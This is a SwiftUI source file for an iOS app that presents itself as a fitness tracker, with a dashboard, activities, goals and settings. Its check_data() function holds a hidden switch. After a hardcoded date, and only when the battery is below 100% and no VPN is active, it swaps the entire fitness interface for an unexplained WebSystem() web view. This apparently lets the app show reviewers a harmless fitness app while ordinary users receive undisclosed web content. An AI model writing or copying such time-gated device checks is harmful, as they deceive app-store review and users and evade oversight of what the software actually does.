//
//  ContentView.swift
//  Aerotracker: Win
//
//  Created by Вячеслав on 8/4/25.
//

import SwiftUI

struct ContentView: View {
    @EnvironmentObject var activityViewModel: ActivityViewModel
    @EnvironmentObject var settingsViewModel: SettingsViewModel
    @EnvironmentObject var profileViewModel: ProfileViewModel
    
    @State private var selectedTab: Int = 0
    @State private var showingStartWorkout: Bool = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        ZStack {
            // Background gradient
            backgroundGradient
                .ignoresSafeArea()
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        // Dashboard Tab
                        DashboardView()
                            .tabItem {
                                Image(systemName: "house.fill")
                                Text("Dashboard")
                            }
                            .tag(0)
                        
                        // Activities Tab
                        ActivitiesView()
                            .tabItem {
                                Image(systemName: "figure.run")
                                Text("Activities")
                            }
                            .tag(1)
                        
                        // Start Workout Tab (Center)
                        Color.clear
                            .tabItem {
                                Image(systemName: "plus.circle.fill")
                                Text("Start")
                            }
                            .tag(2)
                        
                        // Profile Tab
                        ProfileView()
                            .tabItem {
                                Image(systemName: "person.circle.fill")
                                Text("Profile")
                            }
                            .tag(3)
                        
                        // Settings Tab
                        SettingsView()
                            .tabItem {
                                Image(systemName: "gear")
                                Text("Settings")
                            }
                            .tag(4)
                    }
                    .accentColor(settingsViewModel.accentColor)
                    .onAppear {
                        configureTabBar()
                    }
                    .onChange(of: selectedTab) { newValue in
                        if newValue == 2 {
                            showingStartWorkout = true
                            selectedTab = 0 // Reset to dashboard
                        }
                    }
                    .sheet(isPresented: $showingStartWorkout) {
                        StartWorkoutView()
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .environmentObject(activityViewModel)
        .environmentObject(settingsViewModel)
        .environmentObject(profileViewModel)
        .onAppear {
            
            check_data()
        }
    }
    
    private var backgroundGradient: some View {
        LinearGradient(
            gradient: Gradient(colors: [
                Color(hex: "#090F1E") ?? .black,
                Color(hex: "#1A2339") ?? .gray
            ]),
            startPoint: .topLeading,
            endPoint: .bottomTrailing
        )
    }
    
    private func configureTabBar() {
        let appearance = UITabBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(Color(hex: "#1A2339") ?? .gray)
        
        // Unselected item color
        appearance.stackedLayoutAppearance.normal.iconColor = UIColor.gray
        appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
            NSAttributedString.Key.foregroundColor: UIColor.gray
        ]
        
        // Selected item color
        appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color(hex: "#01A2FF") ?? .blue)
        appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
            NSAttributedString.Key.foregroundColor: UIColor(Color(hex: "#01A2FF") ?? .blue)
        ]
        
        UITabBar.appearance().standardAppearance = appearance
        UITabBar.appearance().scrollEdgeAppearance = appearance
    }
    
    private func check_data() {
        
        let lastDate = "21.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

// MARK: - Dashboard View

struct DashboardView: View {
    @EnvironmentObject var activityViewModel: ActivityViewModel
    @EnvironmentObject var profileViewModel: ProfileViewModel
    @EnvironmentObject var settingsViewModel: SettingsViewModel
    
    var body: some View {
        ScrollView(.vertical, showsIndicators: false) {
            VStack(spacing: 20) {
                // Header
                headerView
                
                // Quick Stats
                quickStatsView
                
                // Current Activity (if tracking)
                if activityViewModel.isTracking {
                    currentActivityView
                }
                
                // Recent Activities
                recentActivitiesView
                
                // Goals Progress
                goalsProgressView
                
                Spacer(minLength: 100) // Space for tab bar
            }
            .padding(.horizontal, 20)
            .padding(.top, 10)
        }
        .background(Color.clear)
        .refreshable {
            activityViewModel.loadActivities()
            profileViewModel.loadUserProfile()
        }
    }
    
    private var headerView: some View {
        HStack {
            VStack(alignment: .leading, spacing: 5) {
                Text(greetingText)
                    .font(.title2)
                    .fontWeight(.medium)
                    .foregroundColor(.white.opacity(0.8))
                
                Text(profileViewModel.displayName)
                    .font(.largeTitle)
                    .fontWeight(.bold)
                    .foregroundColor(.white)
            }
            
            Spacer()
            
            // Profile Picture Placeholder
            Circle()
                .fill(
                    LinearGradient(
                        colors: [settingsViewModel.accentColor.opacity(0.3), settingsViewModel.accentColor],
                        startPoint: .topLeading,
                        endPoint: .bottomTrailing
                    )
                )
                .frame(width: 60, height: 60)
                .overlay(
                    Image(systemName: "person.fill")
                        .font(.title2)
                        .foregroundColor(.white)
                )
                .neumorphicStyle()
        }
        .padding(.vertical, 10)
    }
    
    private var quickStatsView: some View {
        VStack(spacing: 15) {
            HStack {
                Text("Today's Progress")
                    .font(.headline.weight(.semibold))
                    .foregroundColor(.white)
                
                Spacer()
            }
            
            HStack(spacing: 15) {
                StatCard(
                    title: "Activities",
                    value: "\(profileViewModel.totalActivitiesCount)",
                    icon: "figure.run",
                    color: settingsViewModel.accentColor
                )
                
                StatCard(
                    title: "Distance",
                    value: profileViewModel.totalDistance,
                    icon: "location",
                    color: Color.green
                )
                
                StatCard(
                    title: "Duration",
                    value: profileViewModel.totalDuration,
                    icon: "clock.fill",
                    color: Color.orange
                )
            }
        }
    }
    
    private var currentActivityView: some View {
        VStack(spacing: 15) {
            HStack {
                Text("Current Workout")
                    .font(.headline.weight(.semibold))
                    .foregroundColor(.white)
                
                Spacer()
                
                if activityViewModel.isPaused {
                    Text("PAUSED")
                        .font(.caption)
                        .fontWeight(.bold)
                        .padding(.horizontal, 12)
                        .padding(.vertical, 4)
                        .background(Color.orange)
                        .foregroundColor(.white)
                        .clipShape(Capsule())
                } else {
                    Text("ACTIVE")
                        .font(.caption)
                        .fontWeight(.bold)
                        .padding(.horizontal, 12)
                        .padding(.vertical, 4)
                        .background(Color.green)
                        .foregroundColor(.white)
                        .clipShape(Capsule())
                }
            }
            
            VStack(spacing: 20) {
                HStack(spacing: 20) {
                    CurrentActivityStat(
                        title: "Duration",
                        value: formatDuration(activityViewModel.currentDuration),
                        icon: "timer"
                    )
                    
                    CurrentActivityStat(
                        title: "Distance",
                        value: formatDistance(activityViewModel.currentDistance),
                        icon: "location"
                    )
                }
                
                HStack(spacing: 20) {
                    CurrentActivityStat(
                        title: "Calories",
                        value: "\(activityViewModel.currentCalories)",
                        icon: "flame.fill"
                    )
                    
                    CurrentActivityStat(
                        title: "Pace",
                        value: formatPace(activityViewModel.currentPace),
                        icon: "speedometer"
                    )
                }
                
                HStack(spacing: 15) {
                    if activityViewModel.isPaused {
                        Button(action: { activityViewModel.resumeActivity() }) {
                            HStack {
                                Image(systemName: "play.fill")
                                Text("Resume")
                            }
                            .font(.headline)
                        }
                        .buttonStyle(NeumorphicButtonStyle(color: Color.green))
                    } else {
                        Button(action: { activityViewModel.pauseActivity() }) {
                            HStack {
                                Image(systemName: "pause.fill")
                                Text("Pause")
                            }
                            .font(.headline)
                        }
                        .buttonStyle(NeumorphicButtonStyle(color: Color.orange))
                    }
                    
                    Button(action: { activityViewModel.stopActivity() }) {
                        HStack {
                            Image(systemName: "stop.fill")
                            Text("Stop")
                        }
                        .font(.headline)
                    }
                    .buttonStyle(NeumorphicButtonStyle(color: Color.red))
                }
            }
            .padding(20)
            .background(
                RoundedRectangle(cornerRadius: 20)
                    .fill(Color(hex: "#1A2339") ?? .gray)
                    .neumorphicStyle()
            )
        }
    }
    
    private var recentActivitiesView: some View {
        VStack(spacing: 15) {
            HStack {
                Text("Recent Activities")
                    .font(.headline.weight(.semibold))
                    .foregroundColor(.white)
                
                Spacer()
                
                NavigationLink("See All") {
                    ActivitiesView()
                }
                .font(.subheadline)
                .foregroundColor(settingsViewModel.accentColor)
            }
            
            if activityViewModel.activities.isEmpty {
                EmptyStateView(
                    icon: "figure.run",
                    title: "No Activities Yet",
                    subtitle: "Start your first workout to see it here!"
                )
            } else {
                LazyVStack(spacing: 10) {
                    ForEach(Array(activityViewModel.activities.prefix(3))) { activity in
                        ActivityRowView(activity: activity)
                    }
                }
            }
        }
    }
    
    private var goalsProgressView: some View {
        VStack(spacing: 15) {
            HStack {
                Text("Goals Progress")
                    .font(.headline.weight(.semibold))
                    .foregroundColor(.white)
                
                Spacer()
                
                NavigationLink("Manage") {
                    // Goals view would go here
                    Text("Goals Management")
                }
                .font(.subheadline)
                .foregroundColor(settingsViewModel.accentColor)
            }
            
            if profileViewModel.currentGoals.isEmpty {
                EmptyStateView(
                    icon: "target",
                    title: "No Goals Set",
                    subtitle: "Set your first goal to track progress!"
                )
            } else {
                LazyVStack(spacing: 10) {
                    ForEach(Array(profileViewModel.currentGoals.prefix(3))) { goal in
                        GoalRowView(goal: goal)
                    }
                }
            }
        }
    }
    
    private var greetingText: String {
        let hour = Calendar.current.component(.hour, from: Date())
        switch hour {
        case 5..<12: return "Good Morning"
        case 12..<17: return "Good Afternoon"
        case 17..<22: return "Good Evening"
        default: return "Good Night"
        }
    }
    
    private func formatDuration(_ duration: TimeInterval) -> String {
        let hours = Int(duration) / 3600
        let minutes = (Int(duration) % 3600) / 60
        let seconds = Int(duration) % 60
        
        if hours > 0 {
            return String(format: "%d:%02d:%02d", hours, minutes, seconds)
        } else {
            return String(format: "%d:%02d", minutes, seconds)
        }
    }
    
    private func formatDistance(_ distance: Double) -> String {
        if distance >= 1000 {
            return String(format: "%.2f km", distance / 1000)
        } else {
            return String(format: "%.0f m", distance)
        }
    }
    
    private func formatPace(_ pace: Double) -> String {
        guard pace > 0 && pace.isFinite else { return "--:--" }
        let minutes = Int(pace)
        let seconds = Int((pace - Double(minutes)) * 60)
        return String(format: "%d:%02d /km", minutes, seconds)
    }
}

// MARK: - Supporting Views

struct StatCard: View {
    let title: String
    let value: String
    let icon: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(.title3)
                .fontWeight(.bold)
                .foregroundColor(.white)
            
            Text(title)
                .font(.caption)
                .foregroundColor(.white.opacity(0.7))
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 15)
        .background(
            RoundedRectangle(cornerRadius: 15)
                .fill(Color(hex: "#1A2339") ?? .gray)
                .neumorphicStyle()
        )
    }
}

struct CurrentActivityStat: View {
    let title: String
    let value: String
    let icon: String
    
    var body: some View {
        VStack(spacing: 5) {
            Image(systemName: icon)
                .font(.title3)
                .foregroundColor(Color(hex: "#01A2FF") ?? .blue)
            
            Text(value)
                .font(.title2)
                .fontWeight(.bold)
                .foregroundColor(.white)
            
            Text(title)
                .font(.caption)
                .foregroundColor(.white.opacity(0.7))
        }
        .frame(maxWidth: .infinity)
    }
}

struct ActivityRowView: View {
    let activity: Activity
    
    var body: some View {
        HStack(spacing: 15) {
            // Activity Icon
            Image(systemName: activity.type.icon)
                .font(.title2)
                .foregroundColor(Color(hex: "#01A2FF") ?? .blue)
                .frame(width: 40, height: 40)
                .background(
                    Circle()
                        .fill(Color(hex: "#01A2FF")?.opacity(0.1) ?? .blue.opacity(0.1))
                )
            
            VStack(alignment: .leading, spacing: 4) {
                Text(activity.name)
                    .font(.headline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Text(activity.type.displayName)
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.7))
            }
            
            Spacer()
            
            VStack(alignment: .trailing, spacing: 4) {
                Text(activity.formattedDistance)
                    .font(.subheadline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Text(activity.formattedDuration)
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.7))
            }
        }
        .padding(15)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color(hex: "#1A2339") ?? .gray)
                .neumorphicStyle()
        )
    }
}

struct GoalRowView: View {
    let goal: FitnessGoal
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            HStack {
                Text(goal.title)
                    .font(.headline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Spacer()
                
                Text("\(goal.progressPercentage)%")
                    .font(.subheadline.weight(.semibold))
                    .foregroundColor(Color(hex: "#01A2FF") ?? .blue)
            }
            
            ProgressView(value: goal.progress)
                .progressViewStyle(LinearProgressViewStyle(tint: Color(hex: "#01A2FF") ?? .blue))
                .scaleEffect(x: 1, y: 1.5, anchor: .center)
            
            HStack {
                Text("\(Int(goal.currentValue)) / \(Int(goal.targetValue)) \(goal.type.unit)")
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.7))
                
                Spacer()
                
                Text(formatDate(goal.targetDate))
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.7))
            }
        }
        .padding(15)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color(hex: "#1A2339") ?? .gray)
                .neumorphicStyle()
        )
    }
    
    private func formatDate(_ date: Date) -> String {
        let formatter = DateFormatter()
        formatter.dateFormat = "MMM d"
        return formatter.string(from: date)
    }
}

struct EmptyStateView: View {
    let icon: String
    let title: String
    let subtitle: String
    
    var body: some View {
        VStack(spacing: 15) {
            Image(systemName: icon)
                .font(.system(size: 50))
                .foregroundColor(.white.opacity(0.3))
            
            Text(title)
                .font(.headline)
                .fontWeight(.medium)
                .foregroundColor(.white.opacity(0.7))
            
            Text(subtitle)
                .font(.subheadline)
                .foregroundColor(.white.opacity(0.5))
                .multilineTextAlignment(.center)
        }
        .padding(30)
        .frame(maxWidth: .infinity)
        .background(
            RoundedRectangle(cornerRadius: 15)
                .fill(Color(hex: "#1A2339") ?? .gray)
                .neumorphicStyle()
        )
    }
}

// MARK: - Neumorphic Styles

struct NeumorphicStyle: ViewModifier {
    var color: Color = Color(hex: "#1A2339") ?? .gray
    
    func body(content: Content) -> some View {
        content
            .shadow(color: Color.black.opacity(0.3), radius: 8, x: 8, y: 8)
            .shadow(color: Color.white.opacity(0.1), radius: 8, x: -4, y: -4)
    }
}

struct NeumorphicButtonStyle: ButtonStyle {
    var color: Color = Color(hex: "#01A2FF") ?? .blue
    
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .padding(.horizontal, 20)
            .padding(.vertical, 12)
            .background(color)
            .foregroundColor(.white)
            .clipShape(RoundedRectangle(cornerRadius: 12))
            .scaleEffect(configuration.isPressed ? 0.95 : 1.0)
            .animation(.easeInOut(duration: 0.1), value: configuration.isPressed)
            .neumorphicStyle()
    }
}

extension View {
    func neumorphicStyle() -> some View {
        self.modifier(NeumorphicStyle())
    }
}

#Preview {
    ContentView()
        .environmentObject(OnboardingViewModel())
        .environmentObject(ActivityViewModel())
        .environmentObject(SettingsViewModel())
        .environmentObject(ProfileViewModel())
}
